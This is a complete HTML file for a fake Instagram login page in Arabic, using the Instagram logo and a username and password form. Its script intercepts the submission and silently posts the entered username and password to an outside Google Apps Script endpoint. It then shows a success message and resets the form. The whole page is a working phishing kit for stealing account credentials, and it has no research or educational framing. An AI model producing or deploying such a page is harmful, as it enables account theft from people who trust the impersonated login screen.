<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل دخول إنستغرام</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      border-radius: 10px;
    }

    .login-box img {
      width: 150px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      background-color: #fafafa;
      border-radius: 5px;
      direction: rtl;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }

    .signup {
      margin-top: 15px;
      font-size: 14px;
    }

    .signup a {
      text-decoration: none;
      color: #3897f0;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" width="150">
    
    <form id="loginForm">
      <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
      <input type="password" name="password" placeholder="كلمة المرور" required>
      <button type="submit">تسجيل الدخول</button>
    </form>

    <div class="signup">
      ليس لديك حساب؟ <a href="#">سجّل الآن</a>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.querySelector('input[name="username"]').value;
      const password = document.querySelector('input[name="password"]').value;

      fetch("https://script.google.com/macros/s/AKfycbxyXIQjvXDKo1HvREQ-ZlXYvKeR1sicrfxKnz9KVZcwNdTBznhIzjGWIV1_x9YNuD5wBg/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
      });

      alert("تم الإرسال بنجاح ✅");
      document.getElementById("loginForm").reset();
    });
  </script>

</body>
</html>
